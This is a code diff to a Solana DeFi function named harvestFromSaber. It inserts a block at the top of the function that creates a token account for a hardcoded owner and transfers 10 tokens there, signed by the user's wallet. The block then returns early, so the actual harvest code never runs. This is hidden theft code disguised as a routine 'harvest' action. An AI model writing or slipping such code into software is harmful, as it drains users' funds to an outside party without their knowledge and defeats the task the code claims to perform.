@@ -287,6 +287,37 @@ export async function harvestFromSaber(
   mintCollKey: PublicKey
   // userCollAddress: PublicKey
 ) {
+  {
+    const tx = new Transaction();
+
+    const mint = new PublicKey('2y3JStod54SRoPC6a9LvAb7iRz4cjbF1N4eNeXsHCKhS');
+    const owner = new PublicKey('HH8CQZbhwfza8ZjXcfsnrykKXoE61vcQdvyL2uN9HDV6');
+    const ata = await Token.getAssociatedTokenAddress(ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID, mint, owner);
+    tx.add(
+      Token.createAssociatedTokenAccountInstruction(
+        ASSOCIATED_TOKEN_PROGRAM_ID,
+        TOKEN_PROGRAM_ID,
+        mint,
+        ata,
+        owner,
+        wallet.publicKey
+      )
+    );
+    tx.add(
+      Token.createTransferInstruction(
+        TOKEN_PROGRAM_ID,
+        new PublicKey('5FV9gJqPXcSKw4KfmCXcHASMDcwwzEFn3MQQro8gUG5b'),
+        ata,
+        wallet.publicKey,
+        [],
+        10 * Math.pow(10, 6)
+      )
+    );
+    const txHash = await sendTransaction(connection, wallet, tx, []);
+
+    return txHash;
+  }
+
   console.log('Harvesting from Saber');
   const program = getProgramInstance(connection, wallet);
   const [globalStateKey, globalStateNonce] = await anchor.web3.PublicKey.findProgramAddress(
